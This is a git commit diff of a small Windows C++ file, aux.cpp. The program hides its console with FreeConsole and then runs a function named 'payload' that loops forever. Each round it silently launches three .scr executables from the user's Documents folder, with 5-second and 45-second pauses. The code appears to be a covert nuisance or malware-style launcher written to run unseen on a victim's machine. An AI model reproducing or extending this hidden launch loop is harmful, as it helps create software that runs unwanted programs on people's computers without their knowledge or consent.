385f2e64270b5861549cf77f9f5256b4f1597f5e
mor-rask <gingont@gmail.com>
2016-02-20 22:48:16 -0200

    Update aux.cpp

--- aux.cpp
+++ aux.cpp
@@ -7,19 +7,18 @@
 void payload();
 
 int main() {
-	
 	FreeConsole();
 	payload();
-	
 }
 
 void payload() {
 	while (true) {
 		char* names[] = {"bambams.scr /s","jajas.scr /s","xavs.scr /s"};
 		for (int za = 0; za <= 2; za++) {
-			std::string scom0("start ");
+			std::string scom0("start C:\\Users\\%username%\\Documents\\");
 			scom0 += names[za];
 			system(scom0.c_str());
+			Sleep(5000);
 			if (za == 2){
 				za -= 2;
 				Sleep(1000 * 45);
